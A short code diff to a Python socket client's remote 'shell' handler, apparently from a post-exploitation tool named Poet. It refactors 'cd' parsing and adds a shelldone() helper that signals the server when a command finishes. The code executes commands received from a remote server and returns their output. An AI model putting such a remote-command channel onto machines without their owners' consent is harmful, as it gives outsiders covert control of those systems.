@@ -69,17 +69,20 @@ def client(client, inp):
         s: PoetSocketClient instance
     """
 
-    inp = inp[6:]  # get rid of 'shell ' prefix
+    # get rid of 'shell ' prefix sent from client
+    inp = inp[6:]
 
     # handle cd builtin
-    if re.search('^cd( .+)?$', inp):
-        if inp == 'cd':
+    _inp = inp.split()
+    if _inp[0] == 'cd':
+        if len(_inp) == 1:
             os.chdir(os.path.expanduser('~'))
         else:
             try:
-                os.chdir(os.path.expanduser(inp[3:]))
+                os.chdir(os.path.expanduser(_inp[1]))
             except OSError as e:
                 client.s.send('cd: {}\n'.format(e.strerror))
+        shelldone(client)
         return
 
     # everything else
@@ -92,13 +95,13 @@ def client(client, inp):
                 if output:
                     client.s.send(output)
                 else:
-                    client.s.send('shelldone')
+                    shelldone(client)
                     return
             elif fd == client.s.s:  # remote signal from server
                 sig = client.s.recv()
                 if sig == 'shellterm':
                     proc.terminate()
-                    client.s.send('shelldone')
+                    shelldone(client)
                     return
 
 
@@ -113,3 +116,7 @@ def get_prompt(client, argv):
     hn = client.cmd_exec('hostname').strip()
     end = '#' if user == 'root' else '$'
     client.s.send('{}@{} {} '.format(user, hn, end))
+
+
+def shelldone(client):
+    client.s.send('shelldone')
